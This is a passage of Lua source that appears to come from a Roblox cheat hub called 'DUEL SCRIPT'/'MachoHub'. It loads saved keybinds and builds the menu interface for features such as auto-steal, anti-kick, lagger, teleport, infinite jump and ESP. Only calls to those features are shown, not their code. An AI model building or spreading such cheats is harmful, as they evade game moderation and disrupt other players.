		uiScaleValue = result.guiScale
	end

	if type(result.autoSwitchSpeed) == "boolean" then
		flag27 = result.autoSwitchSpeed
	end

	if type(result.animPackEnabled) == "boolean" then
		flag28 = result.animPackEnabled
	end

	if type(result.animPackName) == "string" then
		text2 = result.animPackName
	end

	local function fn24(arg)
		if type(arg) ~= "string" or arg == "" then
			return nil
		end

		local ok2, result2 = pcall(function()
			return Enum.KeyCode[arg]
		end)

		if ok2 and result2 and result2 ~= Enum.KeyCode.Unknown then
			return result2
		end
		return nil
	end

	local function fn25(arg, arg2)
		if type(arg) ~= "table" or type(arg2) ~= "table" then
			return
		end

		if arg2.kb ~= nil then
			arg.kb = fn24(arg2.kb)
		end

		if arg2.gp ~= nil then
			arg.gp = fn24(arg2.gp)
		end
	end

	if type(result.keybinds) == "table" then
		for k, keybind in pairs(result.keybinds) do
			if tbl22[k] then
				fn25(tbl22[k], keybind)
			end
		end
	end

	for k, v5 in pairs({
		dropBrainrotKey = "DropBrainrot",
		autoLeftKey = "AutoLeft",
		autoRightKey = "AutoRight",
		autoBatKey = "AutoBat",
		laggerToggleKey = "LaggerToggle",
		laggerCarryKey = "LaggerCarry",
		tpBatKey = "TPBat",
		tpFloorKey = "TPFloor",
		guiHideKey = "GuiHide",
		speedToggleKey = "SpeedToggle",
		batV2Key = "BatV2",
	}) do
		if type(result[k]) == "table" and tbl22[v5] then
			fn25(tbl22[v5], result[k])
		end
	end
end)

pcall(function()
	if flag28 and text2 and text2 ~= "OFF" then
		task.spawn(function()
			task.wait(1.2)

			pcall(function()
				applyAnimPack(text2)
			end)
		end)
	end

	if flag4 then
		task.spawn(function()
			task.wait(0.5)

			if startAntiRagdoll then
				startAntiRagdoll()
			end
		end)
	end

	if flag5 then
		task.spawn(function()
			task.wait(0.5)

			if setInfJumpInternal then
				setInfJumpInternal(true)
			end
		end)
	end

	if tbl23.AutoStealEnabled then
		task.spawn(function()
			task.wait(1)

			if startAutoSteal then
				startAutoSteal()
			end
		end)
	end

	if flag7 then
		task.spawn(function()
			task.wait(1)

			if startBatCounter then
				startBatCounter()
			end
		end)
	end

	if tbl3.antiKick then
		task.spawn(function()
			task.wait(1)
			tbl3.antiKick = false
			tbl3.enableAntiKick()

			if tbl3.setAntiKickVisual then
				tbl3.setAntiKickVisual(true)
			end
		end)
	end

	if flag6 then
		task.spawn(function()
			task.wait(1)
			local character = localPlayer.Character

			if character and setupMedusa then
				setupMedusa(character)
			end
		end)
	end

	if flag22 then
		task.spawn(function()
			task.wait(0.5)

			if startAutoTP then
				startAutoTP()
			end
		end)
	end

	if text and text ~= "" then
		task.spawn(function()
			task.wait(1)

			if CandyApplyCustomSky then
				CandyApplyCustomSky(text)
			end
		end)
	end

	if flag34 then
		task.spawn(function()
			task.wait(1)
			startESP()
		end)
	end
end)

local function fn24()
	local playerGui = localPlayer:WaitForChild("PlayerGui")

	makeDraggable_cyber = function(arg, arg2)
		local flag41 = false
		local position = nil
		local position2, v5

		arg.InputBegan:Connect(function(input)
			if flag33 then
				return
			end

			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag41 = true
				position2 = input.Position
				position = arg2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag41 = false
						v5 = nil
					end
				end)
			end
		end)

		arg.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				v5 = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if not flag41 or input ~= v5 then
				return
			end

			if flag33 then
				flag41 = false
				v5 = nil
				return
			end

			local n20 = input.Position - position2
			arg2.Position = UDim2.new(position.X.Scale, position.X.Offset + n20.X, position.Y.Scale, position.Y.Offset + n20.Y)
		end)

		UserInputService.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag41 = false
				v5 = nil
			end
		end)
	end

	local tbl30 = {
		bg = Color3.fromRGB(9, 11, 12),
		bgDark = Color3.fromRGB(6, 8, 9),
		row = Color3.fromRGB(16, 19, 21),
		input = Color3.fromRGB(13, 16, 18),
		blue = Color3.fromRGB(0, 255, 120),
		blueDim = Color3.fromRGB(0, 150, 80),
		blueDark = Color3.fromRGB(16, 19, 21),
		text = Color3.fromRGB(236, 242, 238),
		textDim = Color3.fromRGB(150, 165, 158),
		textMuted = Color3.fromRGB(105, 118, 112),
		white = Color3.fromRGB(255, 255, 255),
		divider = Color3.fromRGB(34, 40, 38),
		green = Color3.fromRGB(0, 255, 120),
	}

	guiCorner = function(parent, arg)
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, arg or 10)
		uiCorner.Parent = parent
		return uiCorner
	end

	guiStroke = function(parent, color2, thickness)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Color = color2 or Color3.fromRGB(0, 220, 100)
		uiStroke.Thickness = thickness or 1.4
		uiStroke.Transparency = 0.15
		uiStroke.Parent = parent
		return uiStroke
	end

	tw = function(arg, arg2, arg3)
		TweenService:Create(arg, arg3 or TweenInfo.new(0.12), arg2):Play()
	end

	FX = FX or {}
	FX.SHADOW_ASSET = "rbxassetid://6014261993"

	FX.mix = function(arg, arg2, arg3)
		return Color3.new(arg.R + (arg2.R - arg.R) * arg3, arg.G + (arg2.G - arg.G) * arg3, arg.B + (arg2.B - arg.B) * arg3)
	end

	FX.dark = function(arg, arg2)
		return Color3.new(arg.R * arg2, arg.G * arg2, arg.B * arg2)
	end

	FX.accent = function()
		return fn3 and fn3() or Color3.fromRGB(0, 255, 120)
	end

	FX.flowGradient = function(parent, arg)
		local tbl31 = arg or {}
		local color2 = tbl31.color or FX.accent()
		local v5 = FX.dark(color2, tbl31.dim or 0.14)
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Name = "FlowGradient"
		local colorSequence = ColorSequence.new
		local tbl32 = {}
		local v6 = ColorSequenceKeypoint.new(0, v5)
		local v7 = ColorSequenceKeypoint.new(0.3, color2)
		local v8 = ColorSequenceKeypoint.new(0.5, FX.mix(color2, Color3.fromRGB(255, 255, 255), 0.6))
		local v9 = ColorSequenceKeypoint.new(0.7, color2)
		local new = ColorSequenceKeypoint.new
		tbl32[1] = v6
		tbl32[2] = v7
		tbl32[3] = v8
		tbl32[4] = v9

		do
			local values = table.pack(new(1, v5))
			table.move(values, 1, values.n, 5, tbl32)
		end

		uiGradient.Color = colorSequence(tbl32)
		uiGradient.Rotation = tbl31.rotation or 0
		uiGradient.Parent = parent
		local speed = tbl31.speed or 4
		local now2 = os.clock()
		local connection4 = nil

		connection4 = RunService.Heartbeat:Connect(function()
			if not uiGradient.Parent then
				connection4:Disconnect()
				return
			end
			uiGradient.Offset = Vector2.new((os.clock() - now2) / speed % 1 * 2 - 1, 0)
		end)

		return uiGradient
	end

	FX.glow = function(parent, arg)
		local tbl31 = arg or {}
		local spread = tbl31.spread or 18
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Name = tbl31.name or "Glow"
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = FX.SHADOW_ASSET
		imageLabel.ImageColor3 = tbl31.color or FX.accent()
		imageLabel.ImageTransparency = tbl31.transparency or 0.85
		imageLabel.ScaleType = Enum.ScaleType.Slice
		imageLabel.SliceCenter = Rect.new(49, 49, 450, 450)
		imageLabel.Size = UDim2.new(1, spread * 2, 1, spread * 2)
		imageLabel.Position = UDim2.new(0, -spread, 0, -spread)
		imageLabel.ZIndex = tbl31.zindex or 0
		imageLabel.Active = false
		imageLabel.Parent = parent
		return imageLabel
	end

	FX.shadow = function(arg, arg2)
		local tbl31 = arg2 or {}
		tbl31.color = tbl31.color or Color3.fromRGB(0, 0, 0)
		tbl31.transparency = tbl31.transparency or 0.5
		tbl31.spread = tbl31.spread or 28
		tbl31.name = "Shadow"
		return FX.glow(arg, tbl31)
	end

	FX.breathe = function(arg, arg2, arg3, arg4)
		arg2 = arg2 or 0.92
		arg3 = arg3 or 0.78
		arg4 = arg4 or 2.4

		task.spawn(function()
			while true do
				if arg and arg.Parent then
					local tbl31 = { ImageTransparency = arg3 }
					TweenService:Create(arg, TweenInfo.new(arg4 / 2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), tbl31):Play()
					task.wait(arg4 / 2)

					if arg and arg.Parent then
						local tbl32 = { ImageTransparency = arg2 }
						TweenService:Create(arg, TweenInfo.new(arg4 / 2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), tbl32):Play()
						task.wait(arg4 / 2)
						continue
					end
				end

				break
			end
		end)

		return arg
	end

	FX.sheen = function(parent, arg, zIndex)
		local frame = Instance.new("Frame")
		frame.Name = "Sheen"
		frame.Size = UDim2.new(1, 0, 0, 72)
		frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame.BackgroundTransparency = 0.95
		frame.BorderSizePixel = 0
		frame.ZIndex = zIndex or 1
		frame.Active = false
		frame.Parent = parent
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, arg or 18)
		local uiGradient = Instance.new("UIGradient", frame)
		uiGradient.Rotation = 90
		uiGradient.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(1, 1) })
		return frame
	end

	local tbl31 = {}
	GuiRefs = GuiRefs or {}
	GuiRefs.hub = nil
	GuiRefs.outer = nil
	GuiRefs.outerScale = nil
	GuiRefs.inner = nil
	GuiRefs.headerFrame = nil
	GuiRefs.backgroundImage = nil
	GuiRefs.bgGrad = nil
	GuiRefs.categoryList = nil
	GuiRefs.contentFrame = nil
	GuiRefs.chromeGroup = nil
	GuiRefs.machoTitle = nil
	GuiRefs.logoCircle = nil
	GuiRefs.hideGui = nil
	GuiRefs.showGui = nil
	GuiRefs.refreshCanvas = nil
	local frame = nil

	local tbl32 = {
		circle = Enum.KeyCode.E,
		speed = Enum.KeyCode.Q,
		carryMode = Enum.KeyCode.C,
		laggerToggle = Enum.KeyCode.K,
		laggerCarry = Enum.KeyCode.B,
		guiHide = Enum.KeyCode.RightControl,
		dropBrainrot = Enum.KeyCode.H,
		tpDown = Enum.KeyCode.T,
		autoLeft = Enum.KeyCode.J,
		autoRight = Enum.KeyCode.L,
		tpBat = Enum.KeyCode.Y,
		batV2 = Enum.KeyCode.V,
	}

	pcall(function()
		if not (isfile and isfile("MachoHUB.json")) then
			return
		end

		local ok, result = pcall(function()
			return HttpService:JSONDecode(readfile("MachoHUB.json"))
		end)

		if not (ok and type(result) == "table") then
			return
		end

		if type(result.keys) == "table" then
			for k, key in pairs(result.keys) do
				local ok2, result2 = pcall(function()
					return Enum.KeyCode[key]
				end)

				if ok2 and result2 and result2 ~= Enum.KeyCode.Unknown then
					tbl32[k] = result2
				end
			end
		end

		if tbl22 then
			local function fn25(arg)
				if type(arg) ~= "string" or arg == "" then
					return nil
				end

				local ok2, result2 = pcall(function()
					return Enum.KeyCode[arg]
				end)

				if ok2 and result2 and result2 ~= Enum.KeyCode.Unknown then
					return result2
				end
				return nil
			end

			if type(result.keybinds) == "table" then
				for k, keybind in pairs(result.keybinds) do
					if tbl22[k] and type(keybind) == "table" then
						if keybind.kb ~= nil then
							tbl22[k].kb = fn25(keybind.kb)
						end

						if keybind.gp ~= nil then
							tbl22[k].gp = fn25(keybind.gp)
						end
					end
				end
			end

			for k, v5 in pairs({
				dropBrainrotKey = "DropBrainrot",
				autoLeftKey = "AutoLeft",
				autoRightKey = "AutoRight",
				autoBatKey = "AutoBat",
				laggerToggleKey = "LaggerToggle",
				laggerCarryKey = "LaggerCarry",
				tpBatKey = "TPBat",
				tpFloorKey = "TPFloor",
				guiHideKey = "GuiHide",
				speedToggleKey = "SpeedToggle",
				batV2Key = "BatV2",
			}) do
				local v6 = result[k]

				if type(v6) == "table" and tbl22[v5] then
					if v6.kb ~= nil then
						tbl22[v5].kb = fn25(v6.kb)
					end

					if v6.gp ~= nil then
						tbl22[v5].gp = fn25(v6.gp)
					end
				end
			end
		end
	end)

	_GuiKeys = tbl32

	pcall(function()
		if tbl22.GuiHide and tbl22.GuiHide.kb then
			tbl32.guiHide = tbl22.GuiHide.kb
		end

		if tbl22.SpeedToggle and tbl22.SpeedToggle.kb then
			tbl32.carryMode = tbl22.SpeedToggle.kb
		end

		if tbl22.LaggerToggle and tbl22.LaggerToggle.kb then
			tbl32.laggerToggle = tbl22.LaggerToggle.kb
		end

		if tbl22.LaggerCarry and tbl22.LaggerCarry.kb then
			tbl32.laggerCarry = tbl22.LaggerCarry.kb
		end

		if tbl22.AutoBat and tbl22.AutoBat.kb then
			tbl32.circle = tbl22.AutoBat.kb
		end

		if tbl22.TPBat and tbl22.TPBat.kb then
			tbl32.tpBat = tbl22.TPBat.kb
		end

		if tbl22.AutoLeft and tbl22.AutoLeft.kb then
			tbl32.autoLeft = tbl22.AutoLeft.kb
		end

		if tbl22.AutoRight and tbl22.AutoRight.kb then
			tbl32.autoRight = tbl22.AutoRight.kb
		end

		if tbl22.DropBrainrot and tbl22.DropBrainrot.kb then
			tbl32.dropBrainrot = tbl22.DropBrainrot.kb
		end

		if tbl22.TPFloor and tbl22.TPFloor.kb then
			tbl32.tpDown = tbl22.TPFloor.kb
		end

		if tbl22.BatV2 and tbl22.BatV2.kb then
			tbl32.batV2 = tbl22.BatV2.kb
		end

		_GuiKeys = tbl32
	end)

	local function fn25()
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "MachoHub"
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = playerGui
		GuiRefs.hub = screenGui
		local frame2 = Instance.new("Frame")
		frame2.Name = "Outer"
		frame2.Size = UDim2.new(0, 560, 0, 420)
		frame2.Position = UDim2.new(0, 12, 0, 48)
		frame2.BackgroundTransparency = 1
		frame2.BorderSizePixel = 0
		frame2.ClipsDescendants = false
		frame2.Parent = screenGui
		GuiRefs.outer = frame2
		local uiScale = Instance.new("UIScale")
		uiScale.Scale = uiScaleValue
		uiScale.Parent = frame2
		GuiRefs.outerScale = uiScale
		local frame3 = Instance.new("Frame")
		frame3.Name = "Inner"
		frame3.ClipsDescendants = true
		frame3.Size = UDim2.new(1, 0, 1, 0)
		frame3.BackgroundColor3 = tbl30.bg
		frame3.BackgroundTransparency = 0
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		guiCorner(frame3, 20)
		GuiRefs.inner = frame3
		FX.shadow(frame2, { spread = 36, transparency = 0.42, zindex = 0 })
		FX.breathe(FX.glow(frame2, { spread = 26, transparency = 0.9, zindex = 0 }), 0.9, 0.8, 3)
		local v5 = guiStroke(frame3, fn3(), 2.2)
		v5.Transparency = 0.02

		PULSE.add(function(arg)
			if not frame3.Parent then
				return false
			end
			v5.Color = fn3()
			v5.Thickness = 2 + 0.7 * arg
			v5.Transparency = 0.1 - 0.1 * arg
		end)

		local frame4 = Instance.new("Frame")
		frame4.Name = "BackgroundContainer"
		frame4.Size = UDim2.new(1, 0, 1, 0)
		frame4.BackgroundTransparency = 1
		frame4.ZIndex = 0
		frame4.Parent = frame3
		local frame5 = Instance.new("Frame")
		frame5.Name = "BgGrad"
		frame5.Size = UDim2.new(1, 0, 1, 0)
		frame5.BackgroundColor3 = tbl30.bgDark
		frame5.BorderSizePixel = 0
		frame5.ZIndex = 0
		frame5.Parent = frame4
		guiCorner(frame5, 20)
		local uiGradient = Instance.new("UIGradient")
		local colorSequence = ColorSequence.new
		local tbl33 = {}
		local v6 = ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 18, 20))
		local v7 = ColorSequenceKeypoint.new(0.45, Color3.fromRGB(9, 11, 12))
		tbl33[1] = v6
		tbl33[2] = v7

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 7, 8)))
			table.move(values, 1, values.n, 3, tbl33)
		end

		uiGradient.Color = colorSequence(tbl33)
		uiGradient.Rotation = 120
		uiGradient.Parent = frame5
		GuiRefs.bgGrad = frame5
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Name = "AccentBloom"
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = FX.SHADOW_ASSET
		imageLabel.ImageColor3 = fn3()
		imageLabel.ImageTransparency = 0.94
		imageLabel.ScaleType = Enum.ScaleType.Slice
		imageLabel.SliceCenter = Rect.new(49, 49, 450, 450)
		imageLabel.Size = UDim2.new(0.8, 0, 0.8, 0)
		imageLabel.Position = UDim2.new(-0.15, 0, -0.35, 0)
		imageLabel.ZIndex = 0
		imageLabel.Active = false
		imageLabel.Parent = frame4
		local imageLabel2 = Instance.new("ImageLabel")
		imageLabel2.Name = "BackgroundImage"
		imageLabel2.Size = UDim2.new(1, 0, 1, 0)
		imageLabel2.BackgroundTransparency = 1
		imageLabel2.Image = ""
		imageLabel2.ScaleType = Enum.ScaleType.Crop
		imageLabel2.ZIndex = 1
		imageLabel2.ImageTransparency = 0.12
		imageLabel2.Visible = false
		imageLabel2.Parent = frame4
		guiCorner(imageLabel2, 20)
		GuiRefs.backgroundImage = imageLabel2
		bgImageRef = imageLabel2
		local frame6 = Instance.new("Frame")
		frame6.Name = "HeaderFrame"
		GuiRefs.headerFrame = frame6
		frame6.Size = UDim2.new(1, 0, 0, 64)
		frame6.ClipsDescendants = false
		frame6.BackgroundTransparency = 1
		frame6.BorderSizePixel = 0
		frame6.Parent = frame3
		frame6.ZIndex = 2
		makeDraggable_cyber(frame6, frame2)
		local frame7 = Instance.new("Frame")
		frame7.Name = "HeaderHairline"
		frame7.Size = UDim2.new(1, -24, 0, 1)
		frame7.Position = UDim2.new(0, 12, 1, -1)
		frame7.BackgroundColor3 = fn3()
		frame7.BackgroundTransparency = 0.5
		frame7.BorderSizePixel = 0
		frame7.ZIndex = 3
		frame7.Parent = frame6
		local uiGradient2 = Instance.new("UIGradient", frame7)
		local numberSequence = NumberSequence.new
		local tbl34 = {}
		local v8 = NumberSequenceKeypoint.new(0, 1)
		local new = NumberSequenceKeypoint.new
		local v9 = NumberSequenceKeypoint.new(0.45, 0)
		tbl34[1] = v8
		tbl34[2] = v9

		do
			local values = table.pack(new(1, 1))
			table.move(values, 1, values.n, 3, tbl34)
		end

		uiGradient2.Transparency = numberSequence(tbl34)
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = "LogoCircle"
		imageButton.Size = UDim2.new(0, 40, 0, 40)
		imageButton.Position = UDim2.new(0, 10, 0.5, -20)
		imageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
		imageButton.BackgroundTransparency = 0
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.ScaleType = Enum.ScaleType.Crop
		imageButton.Image = ""
		imageButton.ZIndex = 3
		imageButton.Visible = false
		imageButton.Parent = frame6
		Instance.new("UICorner", imageButton).CornerRadius = UDim.new(1, 0)
		local uiStroke = Instance.new("UIStroke", imageButton)
		uiStroke.Color = fn3()
		uiStroke.Thickness = 1.6
		FX.flowGradient(uiStroke, { speed = 3.2, dim = 0.12 })
		FX.breathe(FX.glow(imageButton, { spread = 10, transparency = 0.88, zindex = 2 }), 0.92, 0.8, 2.2)
		logoCircleRef = imageButton
		GuiRefs.logoCircle = imageButton
		visible = true
		imageButton.Visible = true
		imageButton.Image = image
		imageButton.ImageColor3 = Color3.fromRGB(255, 255, 255)

		task.spawn(function()
			if imageButton and imageButton.Parent then
				imageButton.Image = image
				imageButton.ImageColor3 = Color3.fromRGB(255, 255, 255)
			end
		end)

		imageButton.MouseButton1Click:Connect(function()
			pcall(function()
				TweenService:Create(imageButton, TweenInfo.new(0.08), { Size = UDim2.new(0, 34, 0, 34) }):Play()

				task.delay(0.08, function()
					TweenService:Create(imageButton, TweenInfo.new(0.12, Enum.EasingStyle.Back), { Size = UDim2.new(0, 40, 0, 40) }):Play()
				end)
			end)
		end)

		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "MachoTitle"
		textLabel.AnchorPoint = Vector2.new(0, 0.5)
		textLabel.Position = UDim2.new(0, 58, 0.5, 0)
		textLabel.Size = UDim2.new(0, 280, 0, 40)
		textLabel.BackgroundTransparency = 1
		textLabel.BorderSizePixel = 0
		textLabel.Text = "DUEL SCRIPT"
		textLabel.Font = Enum.Font.GothamBlack
		textLabel.TextSize = 22
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel.ZIndex = 6
		textLabel.Parent = frame6
		local v10 = fn3()
		local uiGradient3 = Instance.new("UIGradient", textLabel)
		local colorSequence2 = ColorSequence.new
		local tbl35 = {}
		local v11 = ColorSequenceKeypoint.new(0, FX.mix(v10, Color3.fromRGB(255, 255, 255), 0.8))
		local v12 = ColorSequenceKeypoint.new(0.55, v10)
		local new2 = ColorSequenceKeypoint.new
		local dark = FX.dark
		tbl35[1] = v11
		tbl35[2] = v12

		do
			local values = table.pack(new2(1, dark(v10, 0.55)))
			table.move(values, 1, values.n, 3, tbl35)
		end

		uiGradient3.Color = colorSequence2(tbl35)
		uiGradient3.Rotation = 8
		local uiStroke2 = Instance.new("UIStroke", textLabel)
		uiStroke2.Color = FX.dark(v10, 0.22)
		uiStroke2.Thickness = 1
		uiStroke2.Transparency = 0.55
		GuiRefs.machoTitle = textLabel
		local textButton = Instance.new("TextButton")
		textButton.Size = UDim2.new(0, 28, 0, 28)
		textButton.Position = UDim2.new(1, -38, 0, 12)
		textButton.BackgroundColor3 = tbl30.row
		textButton.BackgroundTransparency = 0.25
		textButton.BorderSizePixel = 0
		textButton.Text = "-"
		textButton.TextColor3 = tbl30.textDim
		textButton.Font = Enum.Font.GothamBold
		textButton.TextSize = 20
		textButton.AutoButtonColor = false
		textButton.ZIndex = 5
		textButton.Parent = frame6
		guiCorner(textButton, 9)
		local v13 = guiStroke(textButton, tbl30.divider, 1)
		v13.Transparency = 0.2

		textButton.MouseEnter:Connect(function()
			tw(textButton, {
				BackgroundTransparency = 0,
				BackgroundColor3 = FX.mix(tbl30.row, fn3(), 0.18),
				TextColor3 = Color3.fromRGB(255, 255, 255),
			}, TweenInfo.new(0.16))

			tw(v13, { Color = fn3(), Transparency = 0.05 }, TweenInfo.new(0.16))
		end)

		textButton.MouseLeave:Connect(function()
			tw(textButton, { BackgroundTransparency = 0.25, BackgroundColor3 = tbl30.row, TextColor3 = tbl30.textDim }, TweenInfo.new(0.16))
			tw(v13, { Color = tbl30.divider, Transparency = 0.2 }, TweenInfo.new(0.16))
		end)

		local textButton2 = Instance.new("TextButton")
		textButton2.Name = "MachoOpenPill"
		textButton2.Size = UDim2.new(0, 200, 0, 44)
		textButton2.Position = frame2.Position
		textButton2.BackgroundColor3 = Color3.fromRGB(10, 12, 14)
		textButton2.BorderSizePixel = 0
		textButton2.Text = ""
		textButton2.AutoButtonColor = false
		textButton2.ZIndex = 20
		textButton2.Visible = false
		textButton2.Parent = GuiRefs.hub
		guiCorner(textButton2, 14)
		local uiStroke3 = Instance.new("UIStroke", textButton2)
		uiStroke3.Color = fn3()
		uiStroke3.Thickness = 1.4
		uiStroke3.Transparency = 0.15
		FX.flowGradient(uiStroke3, { speed = 3.6, dim = 0.1 })
		FX.shadow(textButton2, { spread = 22, transparency = 0.55, zindex = 19 })
		FX.breathe(FX.glow(textButton2, { spread = 16, transparency = 0.9, zindex = 19 }), 0.92, 0.8, 2.4)
		local frame8 = Instance.new("Frame", textButton2)
		frame8.Size = UDim2.new(0, 3, 0.62, 0)
		frame8.Position = UDim2.new(0, 8, 0.5, 0)
		frame8.AnchorPoint = Vector2.new(0, 0.5)
		frame8.BackgroundColor3 = fn3()
		frame8.BorderSizePixel = 0
		frame8.ZIndex = 21
		guiCorner(frame8, 2)
		local frame9 = Instance.new("Frame", textButton2)
		frame9.Size = UDim2.new(0, 30, 0, 30)
		frame9.Position = UDim2.new(0, 16, 0.5, 0)
		frame9.AnchorPoint = Vector2.new(0, 0.5)
		frame9.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
		frame9.BorderSizePixel = 0
		frame9.ZIndex = 21
		guiCorner(frame9, 15)
		local uiStroke4 = Instance.new("UIStroke", frame9)
		uiStroke4.Color = fn3()
		uiStroke4.Thickness = 1.2
		local imageLabel3 = Instance.new("ImageLabel", frame9)
		imageLabel3.Size = UDim2.new(1, -4, 1, -4)
		imageLabel3.Position = UDim2.new(0, 2, 0, 2)
		imageLabel3.BackgroundTransparency = 1
		imageLabel3.Image = image
		imageLabel3.ImageColor3 = Color3.fromRGB(255, 255, 255)
		imageLabel3.ScaleType = Enum.ScaleType.Fit
		imageLabel3.ZIndex = 22
		guiCorner(imageLabel3, 14)
		local textLabel2 = Instance.new("TextLabel", textButton2)
		textLabel2.Size = UDim2.new(0, 90, 0, 16)
		textLabel2.Position = UDim2.new(0, 52, 0, 7)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "FREE DUEL"
		textLabel2.TextColor3 = Color3.fromRGB(240, 245, 250)
		textLabel2.Font = Enum.Font.GothamBlack
		textLabel2.TextSize = 13
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.ZIndex = 21
		local textLabel3 = Instance.new("TextLabel", textButton2)
		textLabel3.Size = UDim2.new(0, 90, 0, 12)
		textLabel3.Position = UDim2.new(0, 52, 0, 24)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "TAP TO OPEN"
		textLabel3.TextColor3 = Color3.fromRGB(150, 155, 165)
		textLabel3.Font = Enum.Font.GothamBold
		textLabel3.TextSize = 10
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		textLabel3.ZIndex = 21
		local frame10 = Instance.new("Frame", textButton2)
		frame10.Size = UDim2.new(0, 48, 0, 24)
		frame10.Position = UDim2.new(1, -56, 0.5, 0)
		frame10.AnchorPoint = Vector2.new(0, 0.5)
		frame10.BackgroundColor3 = fn3()
		frame10.BorderSizePixel = 0
		frame10.ZIndex = 21
		guiCorner(frame10, 7)
		local textLabel4 = Instance.new("TextLabel", frame10)
		textLabel4.Size = UDim2.new(1, 0, 1, 0)
		textLabel4.BackgroundTransparency = 1
		textLabel4.Text = "OPEN"
		textLabel4.TextColor3 = Color3.fromRGB(10, 10, 12)
		textLabel4.Font = Enum.Font.GothamBold
		textLabel4.TextSize = 11
		textLabel4.ZIndex = 22
		local flag41 = false
		local flag42 = false
		local position = nil
		local position2 = nil
		local n20 = 8

		textButton2.InputBegan:Connect(function(input)
			if flag33 then
				return
			end

			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag41 = true
				flag42 = false
				position = input.Position
				position2 = textButton2.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag41 = false
					end
				end)
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if not flag41 then
				return
			end

			if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
				return
			end

			if flag33 then
				flag41 = false
				return
			end
			local n21 = input.Position - position

			if math.abs(n21.X) > n20 or math.abs(n21.Y) > n20 then
				flag42 = true
			end

			if flag42 then
				textButton2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n21.X, position2.Y.Scale, position2.Y.Offset + n21.Y)
			end
		end)

		UserInputService.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag41 = false
			end
		end)

		textButton2.MouseEnter:Connect(function()
			tw(textButton2, { BackgroundColor3 = Color3.fromRGB(18, 20, 24) })
		end)

		textButton2.MouseLeave:Connect(function()
			tw(textButton2, { BackgroundColor3 = Color3.fromRGB(10, 12, 14) })
		end)

		local flag43 = false

		local function fn26()
			return uiScaleValue or GuiRefs.outerScale and GuiRefs.outerScale.Scale or 1
		end

		local function showGui()
			if flag43 then
				return
			end
			flag43 = true
			textButton2.Visible = false
			frame2.Visible = true
			local v14 = fn26()

			if uiScale then
				uiScale.Scale = v14 * 0.82
			end

			if frame3 then
				frame3.BackgroundTransparency = 0.35
			end

			local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

			if uiScale then
				uiScale.Scale = v14 * 0.9
				TweenService:Create(uiScale, tweenInfo, { Scale = v14 }):Play()
			end

			if frame3 then
				TweenService:Create(frame3, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundTransparency = 0 }):Play()
			end

			task.delay(0.3, function()
				flag43 = false
			end)
		end

		local function hideGui()
			if flag43 then
				return
			end
			flag43 = true
			local v14 = fn26()
			local tweenInfo = TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.In)

			if uiScale then
				TweenService:Create(uiScale, tweenInfo, { Scale = v14 * 0.92 }):Play()
			end

			if frame3 then
				TweenService:Create(frame3, tweenInfo, { BackgroundTransparency = 0.45 }):Play()
			end

			task.delay(0.2, function()
				frame2.Visible = false
				textButton2.Visible = true

				if uiScale then
					uiScale.Scale = v14
				end

				if frame3 then
					frame3.BackgroundTransparency = 0
				end

				local uiScale2 = Instance.new("UIScale")
				uiScale2.Scale = 0.7
				uiScale2.Parent = textButton2
				TweenService:Create(uiScale2, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()

				task.delay(0.25, function()
					pcall(function()
						uiScale2:Destroy()
					end)
				end)

				flag43 = false
			end)
		end

		textButton.MouseButton1Click:Connect(hideGui)

		textButton2.MouseButton1Click:Connect(function()
			if flag42 then
				flag42 = false
				return
			end
			showGui()
		end)

		GuiRefs.showGui = showGui
		GuiRefs.hideGui = hideGui
		local frame11 = Instance.new("Frame")
